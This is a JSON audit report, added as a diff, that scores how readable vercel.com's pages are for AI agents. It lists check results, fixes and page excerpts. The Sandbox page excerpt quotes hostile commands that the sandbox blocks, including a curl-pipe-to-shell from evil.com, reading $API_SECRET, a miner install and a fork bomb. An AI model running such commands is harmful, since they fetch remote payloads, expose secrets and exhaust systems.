@@ -1,0 +1,2031 @@
+{
+  "url": "https://vercel.com/",
+  "generatedAt": "2026-07-07T09:40:00.408Z",
+  "crawledPages": 8,
+  "maxPages": 8,
+  "scoring": {
+    "foundationalScore": 59,
+    "heuristicIntelligenceScore": 58,
+    "provisionalScore": 59,
+    "provisionalGrade": "C-",
+    "note": "provisionalScore uses a deterministic heuristic for the intelligence half. The agent should replace heuristicIntelligenceScore with its own 6-dimension LLM evaluation, then compute finalScore = round(0.5*foundationalScore + 0.5*llmIntelligenceScore)."
+  },
+  "checks": [
+    {
+      "id": "title",
+      "label": "Clear page title",
+      "points": 10,
+      "passed": false,
+      "details": "6/8 pages passed this check."
+    },
+    {
+      "id": "meta-description",
+      "label": "Meta description",
+      "points": 10,
+      "passed": false,
+      "details": "5/8 pages passed this check."
+    },
+    {
+      "id": "canonical",
+      "label": "Canonical URL",
+      "points": 8,
+      "passed": true,
+      "details": "8/8 pages passed this check."
+    },
+    {
+      "id": "h1",
+      "label": "Single H1 heading",
+      "points": 8,
+      "passed": true,
+      "details": "7/8 pages passed this check."
+    },
+    {
+      "id": "schema",
+      "label": "Structured data present",
+      "points": 8,
+      "passed": false,
+      "details": "3/8 pages passed this check."
+    },
+    {
+      "id": "schema-types",
+      "label": "Schema types identified",
+      "points": 8,
+      "passed": false,
+      "details": "3/8 pages passed this check."
+    },
+    {
+      "id": "og",
+      "label": "Open Graph basics",
+      "points": 8,
+      "passed": true,
+      "details": "8/8 pages passed this check."
+    },
+    {
+      "id": "internal-links",
+      "label": "Internal linking",
+      "points": 10,
+      "passed": true,
+      "details": "8/8 pages passed this check."
+    },
+    {
+      "id": "image-alt",
+      "label": "Image alt coverage",
+      "points": 8,
+      "passed": false,
+      "details": "3/8 pages passed this check."
+    },
+    {
+      "id": "text-depth",
+      "label": "Readable content depth",
+      "points": 12,
+      "passed": true,
+      "details": "7/8 pages passed this check."
+    },
+    {
+      "id": "indexability",
+      "label": "Indexable for discovery",
+      "points": 10,
+      "passed": true,
+      "details": "8/8 pages passed this check."
+    },
+    {
+      "id": "ai-meta-tags",
+      "label": "AI-accessible meta tags",
+      "points": 6,
+      "passed": true,
+      "details": "8/8 pages passed this check."
+    },
+    {
+      "id": "heading-hierarchy",
+      "label": "Content structure",
+      "points": 6,
+      "passed": false,
+      "details": "4/8 pages passed this check."
+    },
+    {
+      "id": "llms-txt",
+      "label": "llms.txt valid",
+      "passed": true,
+      "points": 10,
+      "details": "Valid llms.txt (191706 chars) + llms-full.txt."
+    },
+    {
+      "id": "ai-bot-access",
+      "label": "AI bot access",
+      "passed": true,
+      "points": 12,
+      "details": "No AI bots blocked in robots.txt."
+    },
+    {
+      "id": "rss-feed",
+      "label": "RSS/Atom feed",
+      "passed": false,
+      "points": 8,
+      "details": "No RSS/Atom feed found."
+    }
+  ],
+  "coverage": [
+    {
+      "pageType": "other",
+      "pages": 5,
+      "avgScore": 69
+    },
+    {
+      "pageType": "docs",
+      "pages": 2,
+      "avgScore": 86
+    },
+    {
+      "pageType": "home",
+      "pages": 1,
+      "avgScore": 91
+    }
+  ],
+  "prioritizedFixes": [
+    {
+      "title": "Add structured data (JSON-LD) on key templates",
+      "impact": "High",
+      "effort": "Medium",
+      "why": "Agents rely on machine-readable entities and page intent signals."
+    },
+    {
+      "title": "Standardize title and meta description quality",
+      "impact": "High",
+      "effort": "Low",
+      "why": "Weak metadata reduces retrieval accuracy and snippet quality."
+    },
+    {
+      "title": "Add an RSS or Atom feed",
+      "impact": "Medium",
+      "effort": "Low",
+      "why": "RSS feeds help AI systems discover and track new content."
+    },
+    {
+      "title": "Improve content structure with clear heading levels",
+      "impact": "Medium",
+      "effort": "Low",
+      "why": "Well-structured H1 → H2 → H3 outlines help AI agents chunk, extract, and cite specific sections."
+    },
+    {
+      "title": "Add recognized schema types to JSON-LD",
+      "impact": "Medium",
+      "effort": "Medium",
+      "why": "Named types like Organization, Product, Article help AI classify your content."
+    }
+  ],
+  "worstPages": [
+    {
+      "url": "https://vercel.com/ship",
+      "score": 60,
+      "maxScore": 112,
+      "pageType": "other"
+    },
+    {
+      "url": "https://vercel.com/geist/note",
+      "score": 78,
+      "maxScore": 112,
+      "pageType": "other"
+    },
+    {
+      "url": "https://vercel.com/ship/ai",
+      "score": 80,
+      "maxScore": 112,
+      "pageType": "other"
+    },
+    {
+      "url": "https://vercel.com/sandbox",
+      "score": 82,
+      "maxScore": 112,
+      "pageType": "other"
+    },
+    {
+      "url": "https://vercel.com/docs/botid",
+      "score": 88,
+      "maxScore": 112,
+      "pageType": "docs"
+    }
+  ],
+  "diagnostics": {
+    "crawlMs": 4022,
+    "robotsFound": true,
+    "robotsBlockedCount": 0,
+    "discoveredFromSitemap": 8,
+    "failedPages": 0
+  },
+  "robots": {
+    "found": true,
+    "aiBotBlocked": [],
+    "sitemapCount": 8
+  },
+  "llmsTxt": {
+    "found": true,
+    "hasH1": true,
+    "hasLink": true,
+    "contentLength": 191706,
+    "fullTxtFound": true
+  },
+  "rssFeed": false,
+  "heuristicIntelligenceSignals": [
+    {
+      "id": "answer-readiness",
+      "signal": "Answer Readiness",
+      "score": 35,
+      "rationale": "Does the content lead with direct answers to questions agents get asked?",
+      "keyFinding": "13% pages have Q&A-style headings; 13% lead with definitions.",
+      "status": "Weak",
+      "fixPriority": "Critical"
+    },
+    {
+      "id": "freshness",
+      "signal": "Freshness",
+      "score": 45,
+      "rationale": "Date signals, update timestamps, and active maintenance indicators.",
+      "keyFinding": "0% pages have date signals; no RSS feed.",
+      "status": "Weak",
+      "fixPriority": "High ROI"
+    },
+    {
+      "id": "evidence-density",
+      "signal": "Evidence Density",
+      "score": 59,
+      "rationale": "Density of statistics, data points, named sources, and in-text citations.",
+      "keyFinding": "63% pages include numeric evidence; 0% have author attribution.",
+      "status": "Weak",
+      "fixPriority": "High ROI"
+    },
+    {
+      "id": "structural-clarity",
+      "signal": "Structural Clarity",
+      "score": 61,
+      "rationale": "Clean semantic HTML structure that survives extraction to markdown.",
+      "keyFinding": "50% clean heading hierarchy; 88% have single H1.",
+      "status": "Moderate",
+      "fixPriority": "High ROI"
+    },
+    {
+      "id": "quotability",
+      "signal": "Quotability",
+      "score": 65,
+      "rationale": "Can an agent extract clean, self-contained passages to quote as citations?",
+      "keyFinding": "75% pages have rich headings; 88% meet depth threshold.",
+      "status": "Moderate",
+      "fixPriority": "Quick Win"
+    },
+    {
+      "id": "content-depth",
+      "signal": "Content Depth",
+      "score": 82,
+      "rationale": "Substantive long-form content that covers topics with depth and breadth.",
+      "keyFinding": "88% pages meet depth threshold across 3 template types.",
+      "status": "Strong",
+      "fixPriority": "Monitor"
+    }
+  ],
+  "pagesForReview": [
+    {
+      "url": "https://vercel.com/",
+      "pageType": "home",
+      "score": 102,
+      "maxScore": 112,
+      "aiView": {
+        "title": "Agentic Infrastructure - Vercel",
+        "metaDescription": "The autonomous stack for every app and agent.",
+        "h1": [
+          "Agentic Infrastructure"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Agent Stack",
+          "Core Platform",
+          "Tools",
+          "Learn",
+          "Build",
+          "Explore",
+          "Build agents on infrastructure that thinks like them",
+          "Ship apps that scale from zero to millions instantly",
+          "Host platforms that serve every customer",
+          "Recently shipped",
+          "Built by you, or your agents",
+          "Agent Stack",
+          "Core Platform",
+          "Security",
+          "Tools",
+          "Frameworks"
+        ],
+        "jsonLdCount": 1,
+        "schemaTypes": [
+          "SoftwareApplication"
+        ],
+        "jsonLdSummary": "@type=SoftwareApplication | name=Vercel | description=Vercel provides the developer tools and cloud infrastructure to build, scale, and secure a faster, m",
+        "internalLinkCount": 144,
+        "textExcerpt": "Build agents on infrastructure that thinks like them Notion powers millions of agent conversations daily on Vercel. Features Durable Orchestration Sandboxed Environments AI Model Gateway Fluid Compute Ship apps that scale from zero to millions instantly Zapier serves over 100 million monthly website visits on Vercel. Features Global Delivery Deployment Environments Serverless Functions Web Application Firewall Host platforms that serve every customer Mintlify powers documentation for 20,000+ companies on Vercel Features Tenant Isolation Domain Management Custom SSL Certificates Preview URLs Recently shipped Iss 2026 ▲ vercel deploy Vercel CLI ✓ Building image from Dockerfile.vercel ✓ Stored image in your project's registry ✓ Deployed to Fluid compute Production: https://my-server.vercel.app Built by you, or your agents Deploy Plugin Plugin $ npx plugins add vercel/vercel-plugin npx plugins add vercel/vercel-plugin",
+        "bodyWordCount": 2248,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com",
+        "hasOg": true,
+        "imgCount": 19,
+        "imgsWithAlt": 16,
+        "headingLevels": [
+          5,
+          5,
+          5,
+          5,
+          5,
+          5,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          1,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2
+        ]
+      }
+    },
+    {
+      "url": "https://vercel.com/docs/botid",
+      "pageType": "docs",
+      "score": 88,
+      "maxScore": 112,
+      "aiView": {
+        "title": "BotID",
+        "metaDescription": "Protect your applications from automated attacks with intelligent bot detection and verification, powered by Kasada.",
+        "h1": [
+          "BotID"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Build with AI",
+          "Deploy &amp; scale",
+          "Operate &amp; protect",
+          "Resources",
+          "Resources",
+          "Validation flow",
+          "Check levels",
+          "Basic",
+          "Deep Analysis",
+          "Pricing",
+          "Bypassing BotID",
+          "BotID observability",
+          "More resources",
+          "On this page",
+          "Agent Stack",
+          "Core Platform"
+        ],
+        "jsonLdCount": 3,
+        "schemaTypes": [
+          "WebSite",
+          "TechArticle",
+          "BreadcrumbList"
+        ],
+        "jsonLdSummary": "@type=WebSite | name=Vercel Documentation | publisher=Vercel Inc.\n@type=TechArticle | author=Vercel | dateModified=2026-06-16T16:30:47. | description=Protect your applications from automated attacks with intelligent bot detection and verification, po\n@type=BreadcrumbList",
+        "internalLinkCount": 211,
+        "textExcerpt": "Copy page Copy page BotID Copy page Copy page BotID is available on all plans Vercel BotID is an invisible CAPTCHA that protects against sophisticated bots without showing visible challenges or requiring user action. It's a client-side challenge that uses machine learning to distinguish between humans and bots. It adds a protection layer to high-value routes, such as checkouts, signups, and APIs, that are common targets for bots imitating real users. Sophisticated bots are designed to closely mimic real user behavior. They can run JavaScript, solve CAPTCHAs, and navigate interfaces in ways that closely resemble humans. Tools like Playwright and Puppeteer automate these sessions, simulating actions from page load to form submission. These bots aim to blend in with normal traffic, making detection difficult and mitigation costly. Resources Getting Started - Setup guide with complete code examples Verified Bots - Information about verified bots and their handling Bypass BotID - Configure bypass rules for BotID detection View our BotID Next.js starter template Get Started Open in v0 Validation flow BotID validates clients with these steps: A client-side challenge is sent to the browser. The browser solves the challenge and includes the solution in requests to your high-value endpoint. Your server-side code calls checkBotId() Vercel validates the integrity of the challenge response. Deep Analysis uses a machine learning model to analyze the client side signals, if configured. The server-side code receives the analysis result, where the application can take action. Check levels BotID can be configured to run at one of two levels, Basic or Deep Analysis . Deep Analysis runs only after the Basic validation has passed. Basic The Basic level validates the integrity and correctness of the challenge response, catching many less sophisticated bots. It is provided free of charge for all plans. Deep Analysis BotID includes Deep Analysis , powered by Kasada . Kasada is a leading bo",
+        "bodyWordCount": 1079,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/docs/botid",
+        "hasOg": true,
+        "imgCount": 3,
+        "imgsWithAlt": 2,
+        "headingLevels": [
+          5,
+          5,
+          5,
+          5,
+          3,
+          3,
+          3,
+          3,
+          1,
+          3,
+          2,
+          2,
+          3,
+          3,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2
+        ]
+      }
+    },
+    {
+      "url": "https://vercel.com/docs/git",
+      "pageType": "docs",
+      "score": 104,
+      "maxScore": 112,
+      "aiView": {
+        "title": "Deploying Git Repositories with Vercel",
+        "metaDescription": "Vercel allows for automatic deployments on every branch push and merges onto the production branch of your GitHub, GitLab, and Bitbucket projects.",
+        "h1": [
+          "Deploying Git Repositories with Vercel"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Build with AI",
+          "Deploy &amp; scale",
+          "Operate &amp; protect",
+          "Resources",
+          "Supported Git Providers",
+          "Self-Hosted examples",
+          "Deploying a Git repository",
+          "Creating a deployment from a Git reference",
+          "Deploying private Git repositories",
+          "Using Pro teams",
+          "Using Hobby teams",
+          "Deploying forks of public Git repositories",
+          "Production branch",
+          "Default configuration",
+          "Customizing the production branch",
+          "Preview branches"
+        ],
+        "jsonLdCount": 3,
+        "schemaTypes": [
+          "WebSite",
+          "TechArticle",
+          "BreadcrumbList"
+        ],
+        "jsonLdSummary": "@type=WebSite | name=Vercel Documentation | publisher=Vercel Inc.\n@type=TechArticle | author=Vercel | dateModified=2026-06-16T16:30:47. | description=Vercel allows for automatic deployments on every branch push and merges onto the production branch o\n@type=BreadcrumbList",
+        "internalLinkCount": 239,
+        "textExcerpt": "Copy page Copy page Deploying Git Repositories with Vercel Copy page Copy page Vercel allows for automatic deployments on every branch push and merges onto the production branch of your GitHub , GitLab , Bitbucket and Azure DevOps Pipelines projects. Using Git with Vercel provides the following benefits: Preview deployments for every push. Production deployments for the most recent changes from the production branch . Instant rollbacks when reverting changes assigned to a custom domain. When working with Git, have a branch that works as your production branch, often called main . After you create a pull request (PR) to that branch, Vercel creates a unique deployment you can use to preview any changes. Once you are happy with the changes, you can merge your PR into the main branch, and Vercel will create a production deployment. You can choose to use a different branch as the production branch . Supported Git Providers GitHub Free GitHub Team GitHub Enterprise Cloud GitLab Free GitLab Premium GitLab Ultimate GitLab Enterprise Bitbucket Free Bitbucket Standard Bitbucket Premium Azure DevOps Pipelines Self-Hosted examples GitHub Enterprise Server Self-Managed GitLab Bitbucket Data Center (Self-Hosted) If your provider is not listed here, you can also use the Vercel CLI to deploy with any git provider. Deploying a Git repository Setting up your GitHub, GitLab, or Bitbucket repository on Vercel is only a matter of clicking the \"New Project\" button on the top right of your dashboard and following the steps. For Azure DevOps repositories, use the Vercel Deployment Extension After clicking it, you'll be presented with a list of Git repositories that the Git account you've signed up with has write access to. To select a different Git namespace or provider, you can use the dropdown list on the top left of the section. A list of Git repositories your Git account has access to. You can also import a third-party Git repository . After you've selected the Git repository or templa",
+        "bodyWordCount": 2016,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/docs/git",
+        "hasOg": true,
+        "imgCount": 5,
+        "imgsWithAlt": 2,
+        "headingLevels": [
+          5,
+          5,
+          5,
+          5,
+          3,
+          3,
+          3,
+          3,
+          1,
+          2,
+          3,
+          2,
+          3,
+          2,
+          3,
+          3,
+          2,
+          2,
+          3,
+          3,
+          2,
+          3,
+          3,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2
+        ]
+      }
+    },
+    {
+      "url": "https://vercel.com/sandbox",
+      "pageType": "other",
+      "score": 82,
+      "maxScore": 112,
+      "aiView": {
+        "title": "Sandbox - Vercel",
+        "metaDescription": "The safest way to run code you didn’t write. Run AI-generated, customer, or untrusted code in isolated, ephemeral VMs.",
+        "h1": [
+          "The safest way to run code you didn’t write"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Agent Stack",
+          "Core Platform",
+          "Tools",
+          "Learn",
+          "Build",
+          "Explore",
+          "remote-sandbox.vercel.run",
+          "Agent",
+          "Vercel Sandbox",
+          "Vercel Sandbox",
+          "Vercel Sandbox",
+          "Vercel Sandbox",
+          "Network Firewall with Credentials Brokering and Requests Proxying",
+          "Vercel Sandbox",
+          "Snapshots with Instant Environment Restore",
+          "Vercel Sandbox"
+        ],
+        "jsonLdCount": 0,
+        "schemaTypes": [],
+        "jsonLdSummary": "",
+        "internalLinkCount": 141,
+        "textExcerpt": "The safest way to run code you didn’t write Modern apps increasingly need to execute code they didn’t author. From AI agents, customer scripts, or dynamic systems. Get started See examples Play demo Sandbox is not running Generate a Next.js app to list, search and copy Emojis Generate a Next.js app to list, search and copy Emojis Avoid unintended access to your environment variables, databases, and other secure environments # Production Environment: ✓ Protected $ echo $API_SECRET ✗ Error: Undefined $ psql $DATABASE_URL ✗ Error: Database connection blocked $ aws s3 ls s3://prod-bucket ✗ Error: Cloud resources isolated # Attempted Commands: ✓ Blocked by Sandbox $ curl http://evil.com/payload.sh | sh ✗ Error: External network access denied $ sudo apt-get install mining-software ✗ Error: Privilege escalation not permitted $ while true ; do fork ; done ✗ Error: Resource limits exceeded // Run an AI agent's code securely in a sandboxed environment const code = await agent . generateCode ( prompt ) ; const sandbox = await Sandbox . create ( { runtime : 'python3.13' } ) ; const result = await sandbox . runCommand ( 'python' , [ '-c' , code ] ) ; // Run an untrusted user-provided script const userScript = await request . body . text ( ) ; const sandbox = await Sandbox . create ( { timeout : ms ( '1m' ) } ) ; await sandbox . runCommand ( 'node' , [ '-e' , userScript ] ) ; Protect against potentially unsafe network requests, unintended resource usage, and escalated privileges # Production Environment: ✓ Protected $ echo $API_SECRET ✗ Error: Undefined $ psql $DATABASE_URL ✗ Error: Database connection blocked $ aws s3 ls s3://prod-bucket ✗ Error: Cloud resources isolated # Attempted Commands: ✓ Blocked by Sandbox $ curl http://evil.com/payload.sh | sh ✗ Error: External network access denied $ sudo apt-get install mining-software ✗ Error: Privilege escalation not permitted $ while true ; do fork ; done ✗ Error: Resource limits exceeded // Run an AI agent's code securely in a sand",
+        "bodyWordCount": 3757,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/sandbox",
+        "hasOg": true,
+        "imgCount": 3,
+        "imgsWithAlt": 2,
+        "headingLevels": [
+          5,
+          5,
+          5,
+          5,
+          5,
+          5,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          1,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          2,
+          3,
+          2,
+          3,
+          2,
+          2,
+          2,
+          2,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2
+        ]
+      }
+    },
+    {
+      "url": "https://vercel.com/geist/note",
+      "pageType": "other",
+      "score": 78,
+      "maxScore": 112,
+      "aiView": {
+        "title": "Note",
+        "metaDescription": "Display text that requires attention or provides additional information.",
+        "h1": [
+          "Note"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Default",
+          "Action",
+          "Success",
+          "Error",
+          "Warning",
+          "Secondary",
+          "Violet",
+          "Cyan",
+          "Disabled",
+          "Labels",
+          "Default label",
+          "Custom label",
+          "No label",
+          "Best Practices",
+          "When to use",
+          "Behavior"
+        ],
+        "jsonLdCount": 0,
+        "schemaTypes": [],
+        "jsonLdSummary": "",
+        "internalLinkCount": 98,
+        "textExcerpt": "Note Display text that requires attention or provides additional information. Default A small note. A default note. A large note. Show code Action This note details some information. Upgrade This note details a large amount information that could potentially wrap into two or more lines, forcing the height of the Note to be larger. Upgrade Show code Success This note details some success information. This note details some success information. Upgrade This note details some success information. Check the documentation to learn more. Upgrade This filled note details some success information. This filled note details some success information. Upgrade This filled note details some success information. Check the documentation to learn more. Upgrade Show code Error This note details some error information. This note details some error information. Upgrade This note details some success information. Check the documentation to learn more. Upgrade This filled note details some error information. This filled note details some error information. Upgrade This filled note details some success information. Check the documentation to learn more. Upgrade Show code Warning This note details some warning information. This note details some warning information. Upgrade This note details some success information. Check the documentation to learn more. Upgrade This filled note details some warning information. This filled note details some warning information. Upgrade This filled note details some success information. Check the documentation to learn more. Upgrade Show code Secondary This note details some secondary information. This note details some secondary information. Upgrade This note details some success information. Check the documentation to learn more. Upgrade This filled note details some secondary information. This filled note details some secondary information. Upgrade This filled note details some success information. Check the documentation to learn more. Upgrade Show co",
+        "bodyWordCount": 4495,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/geist/note",
+        "hasOg": true,
+        "imgCount": 18,
+        "imgsWithAlt": 6,
+        "headingLevels": [
+          1,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          3,
+          3,
+          3,
+          2,
+          3,
+          3,
+          3
+        ]
+      }
+    }
+  ],
+  "pageAudits": [
+    {
+      "url": "https://vercel.com/",
+      "score": 102,
+      "maxScore": 112,
+      "summary": "Strong for AI agents. Improve a few weak signals to harden performance.",
+      "checks": [
+        {
+          "id": "title",
+          "label": "Clear page title",
+          "passed": true,
+          "points": 10,
+          "details": "Found title (31 chars)."
+        },
+        {
+          "id": "meta-description",
+          "label": "Meta description",
+          "passed": false,
+          "points": 10,
+          "details": "Found description (45 chars)."
+        },
+        {
+          "id": "canonical",
+          "label": "Canonical URL",
+          "passed": true,
+          "points": 8,
+          "details": "Canonical: https://vercel.com"
+        },
+        {
+          "id": "h1",
+          "label": "Single H1 heading",
+          "passed": true,
+          "points": 8,
+          "details": "Found 1 h1 tag(s)."
+        },
+        {
+          "id": "schema",
+          "label": "Structured data present",
+          "passed": true,
+          "points": 8,
+          "details": "Found 1 JSON-LD block(s)."
+        },
+        {
+          "id": "schema-types",
+          "label": "Schema types identified",
+          "passed": true,
+          "points": 8,
+          "details": "Types: SoftwareApplication"
+        },
+        {
+          "id": "og",
+          "label": "Open Graph basics",
+          "passed": true,
+          "points": 8,
+          "details": "og:title and og:description found."
+        },
+        {
+          "id": "internal-links",
+          "label": "Internal linking",
+          "passed": true,
+          "points": 10,
+          "details": "Found 144 internal links."
+        },
+        {
+          "id": "image-alt",
+          "label": "Image alt coverage",
+          "passed": true,
+          "points": 8,
+          "details": "16/19 images include alt text."
+        },
+        {
+          "id": "text-depth",
+          "label": "Readable content depth",
+          "passed": true,
+          "points": 12,
+          "details": "Estimated 2248 words in body text."
+        },
+        {
+          "id": "indexability",
+          "label": "Indexable for discovery",
+          "passed": true,
+          "points": 10,
+          "details": "No noindex directive found."
+        },
+        {
+          "id": "ai-meta-tags",
+          "label": "AI-accessible meta tags",
+          "passed": true,
+          "points": 6,
+          "details": "No restrictive AI meta tags."
+        },
+        {
+          "id": "heading-hierarchy",
+          "label": "Content structure",
+          "passed": true,
+          "points": 6,
+          "details": "Clean heading structure (4 levels) — easy for AI agents to chunk and cite."
+        }
+      ],
+      "aiView": {
+        "title": "Agentic Infrastructure - Vercel",
+        "metaDescription": "The autonomous stack for every app and agent.",
+        "h1": [
+          "Agentic Infrastructure"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Agent Stack",
+          "Core Platform",
+          "Tools",
+          "Learn",
+          "Build",
+          "Explore",
+          "Build agents on infrastructure that thinks like them",
+          "Ship apps that scale from zero to millions instantly",
+          "Host platforms that serve every customer",
+          "Recently shipped",
+          "Built by you, or your agents",
+          "Agent Stack",
+          "Core Platform",
+          "Security",
+          "Tools",
+          "Frameworks"
+        ],
+        "jsonLdCount": 1,
+        "schemaTypes": [
+          "SoftwareApplication"
+        ],
+        "jsonLdSummary": "@type=SoftwareApplication | name=Vercel | description=Vercel provides the developer tools and cloud infrastructure to build, scale, and secure a faster, m",
+        "internalLinkCount": 144,
+        "textExcerpt": "Build agents on infrastructure that thinks like them Notion powers millions of agent conversations daily on Vercel. Features Durable Orchestration Sandboxed Environments AI Model Gateway Fluid Compute Ship apps that scale from zero to millions instantly Zapier serves over 100 million monthly website visits on Vercel. Features Global Delivery Deployment Environments Serverless Functions Web Application Firewall Host platforms that serve every customer Mintlify powers documentation for 20,000+ companies on Vercel Features Tenant Isolation Domain Management Custom SSL Certificates Preview URLs Recently shipped Iss 2026 ▲ vercel deploy Vercel CLI ✓ Building image from Dockerfile.vercel ✓ Stored image in your project's registry ✓ Deployed to Fluid compute Production: https://my-server.vercel.app Built by you, or your agents Deploy Plugin Plugin $ npx plugins add vercel/vercel-plugin npx plugins add vercel/vercel-plugin",
+        "bodyWordCount": 2248,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com",
+        "hasOg": true,
+        "imgCount": 19,
+        "imgsWithAlt": 16,
+        "headingLevels": [
+          5,
+          5,
+          5,
+          5,
+          5,
+          5,
+          3,
+          3,
+          3,
+          3,
+          3,
+          3,
+          1,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2,
+          2
+        ]
+      },
+      "pageType": "home"
+    },
+    {
+      "url": "https://vercel.com/sandbox",
+      "score": 82,
+      "maxScore": 112,
+      "summary": "Decent base, but key machine-readable signals are missing.",
+      "checks": [
+        {
+          "id": "title",
+          "label": "Clear page title",
+          "passed": true,
+          "points": 10,
+          "details": "Found title (16 chars)."
+        },
+        {
+          "id": "meta-description",
+          "label": "Meta description",
+          "passed": true,
+          "points": 10,
+          "details": "Found description (118 chars)."
+        },
+        {
+          "id": "canonical",
+          "label": "Canonical URL",
+          "passed": true,
+          "points": 8,
+          "details": "Canonical: https://vercel.com/sandbox"
+        },
+        {
+          "id": "h1",
+          "label": "Single H1 heading",
+          "passed": true,
+          "points": 8,
+          "details": "Found 1 h1 tag(s)."
+        },
+        {
+          "id": "schema",
+          "label": "Structured data present",
+          "passed": false,
+          "points": 8,
+          "details": "No JSON-LD structured data found."
+        },
+        {
+          "id": "schema-types",
+          "label": "Schema types identified",
+          "passed": false,
+          "points": 8,
+          "details": "No recognized @type found in JSON-LD."
+        },
+        {
+          "id": "og",
+          "label": "Open Graph basics",
+          "passed": true,
+          "points": 8,
+          "details": "og:title and og:description found."
+        },
+        {
+          "id": "internal-links",
+          "label": "Internal linking",
+          "passed": true,
+          "points": 10,
+          "details": "Found 141 internal links."
+        },
+        {
+          "id": "image-alt",
+          "label": "Image alt coverage",
+          "passed": false,
+          "points": 8,
+          "details": "2/3 images include alt text."
+        },
+        {
+          "id": "text-depth",
+          "label": "Readable content depth",
+          "passed": true,
+          "points": 12,
+          "details": "Estimated 3757 words in body text."
+        },
+        {
+          "id": "indexability",
+          "label": "Indexable for discovery",
+          "passed": true,
+          "points": 10,
+          "details": "No noindex directive found."
+        },
+        {
+          "id": "ai-meta-tags",
+          "label": "AI-accessible meta tags",
+          "passed": true,
+          "points": 6,
+          "details": "No restrictive AI meta tags."
+        },
+        {
+          "id": "heading-hierarchy",
+          "label": "Content structure",
+          "passed": false,
+          "points": 6,
+          "details": "Heading levels skipped — weakens the content outline AI agents use for extraction."
+        }
+      ],
+      "aiView": {
+        "title": "Sandbox - Vercel",
+        "metaDescription": "The safest way to run code you didn’t write. Run AI-generated, customer, or untrusted code in isolated, ephemeral VMs.",
+        "h1": [
+          "The safest way to run code you didn’t write"
+        ],
+        "h1Count": 1,
+        "headings": [
+          "Agent Stack",
+          "Core Platform",
+          "Tools",
+          "Learn",
+          "Build",
+          "Explore",
+          "remote-sandbox.vercel.run",
+          "Agent",
+          "Vercel Sandbox",
+          "Vercel Sandbox",
+          "Vercel Sandbox",
+          "Vercel Sandbox",
+          "Network Firewall with Credentials Brokering and Requests Proxying",
+          "Vercel Sandbox",
+          "Snapshots with Instant Environment Restore",
+          "Vercel Sandbox"
+        ],
+        "jsonLdCount": 0,
+        "schemaTypes": [],
+        "jsonLdSummary": "",
+        "internalLinkCount": 141,
+        "textExcerpt": "The safest way to run code you didn’t write Modern apps increasingly need to execute code they didn’t author. From AI agents, customer scripts, or dynamic systems. Get started See examples Play demo Sandbox is not running Generate a Next.js app to list, search and copy Emojis Generate a Next.js app to list, search and copy Emojis Avoid unintended access to your environment variables, databases, and other secure environments # Production Environment: ✓ Protected $ echo $API_SECRET ✗ Error: Undefined $ psql $DATABASE_URL ✗ Error: Database connection blocked $ aws s3 ls s3://prod-bucket ✗ Error: Cloud resources isolated # Attempted Commands: ✓ Blocked by Sandbox $ curl http://evil.com/payload.sh | sh ✗ Error: External network access denied $ sudo apt-get install mining-software ✗ Error: Privilege escalation not permitted $ while true ; do fork ; done ✗ Error: Resource limits exceeded // Run an AI agent's code securely in a sandboxed environment const code = await agent . generateCode ( prompt ) ; const sandbox = await Sandbox . create ( { runtime : 'python3.13' } ) ; const result = await sandbox . runCommand ( 'python' , [ '-c' , code ] ) ; // Run an untrusted user-provided script const userScript = await request . body . text ( ) ; const sandbox = await Sandbox . create ( { timeout : ms ( '1m' ) } ) ; await sandbox . runCommand ( 'node' , [ '-e' , userScript ] ) ; Protect against potentially unsafe network requests, unintended resource usage, and escalated privileges # Production Environment: ✓ Protected $ echo $API_SECRET ✗ Error: Undefined $ psql $DATABASE_URL ✗ Error: Database connection blocked $ aws s3 ls s3://prod-bucket ✗ Error: Cloud resources isolated # Attempted Commands: ✓ Blocked by Sandbox $ curl http://evil.com/payload.sh | sh ✗ Error: External network access denied $ sudo apt-get install mining-software ✗ Error: Privilege escalation not permitted $ while true ; do fork ; done ✗ Error: Resource limits exceeded // Run an AI agent's code securely in a sand",
+        "bodyWordCount": 3757,
+        "publishedDate": "",
+        "modifiedDate": "",
+        "author": "",
+        "aiMetaTags": [],
+        "hasNoindex": false,
+        "canonical": "https://vercel.com/sandbox",
+        "hasOg": true,
+        "imgCount": 3,
+        "imgsWithAlt": 2,
+        "headingLevels": [
+          5,
+          5,
+          5,
